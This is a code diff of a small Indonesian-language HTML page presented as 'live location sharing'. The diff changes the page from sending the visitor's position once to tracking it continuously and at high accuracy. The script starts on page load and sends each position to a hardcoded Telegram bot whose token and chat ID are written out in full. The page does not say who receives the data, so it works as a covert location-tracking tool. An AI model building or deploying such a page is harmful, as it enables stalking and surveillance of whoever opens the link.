@@ -1,47 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Share Lokasi</title>
+  <title>Live Share Lokasi</title>
 </head>
 <body>
-  <h2>Meminta Lokasi...</h2>
-  <p id="status">Mengambil lokasi...</p>
+  <h2>Berbagi Lokasi Langsung</h2>
+  <p id="status">Mengaktifkan pelacakan lokasi...</p>
 
   <script>
+    const token = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
+    const chatId = "5677912817";
+
     function sendLocation(lat, lon) {
-      const token = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
-      const chatId = "5677912817";
       const url = `https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;
 
       fetch(url)
         .then(response => {
           if (response.ok) {
-            document.getElementById("status").innerText = "Lokasi kamu berhasil dikirim dengan aman.";
+            document.getElementById("status").innerText = `Lokasi terkirim: ${lat}, ${lon}`;
           } else {
             document.getElementById("status").innerText = "Gagal mengirim lokasi.";
           }
         })
         .catch(err => {
-          document.getElementById("status").innerText = "Terjadi kesalahan: " + err;
+          document.getElementById("status").innerText = "Error: " + err;
         });
     }
 
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            sendLocation(position.coords.latitude, position.coords.longitude);
-          },
-          () => {
-            document.getElementById("status").innerText = "Gagal mendapatkan lokasi. Mohon izinkan akses lokasi di browser kamu.";
-          }
-        );
-      } else {
-        document.getElementById("status").innerText = "Geolocation tidak didukung oleh browser ini.";
+    function startTracking() {
+      if (!navigator.geolocation) {
+        document.getElementById("status").innerText = "Geolocation tidak didukung browser.";
+        return;
       }
+
+      navigator.geolocation.watchPosition(
+        (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          sendLocation(lat, lon);
+        },
+        (error) => {
+          document.getElementById("status").innerText = "Gagal akses lokasi: " + error.message;
+        },
+        {
+          enableHighAccuracy: true,
+          maximumAge: 5000,
+          timeout: 10000
+        }
+      );
     }
 
-    getLocation();
+    startTracking();
   </script>
 </body>
 </html>
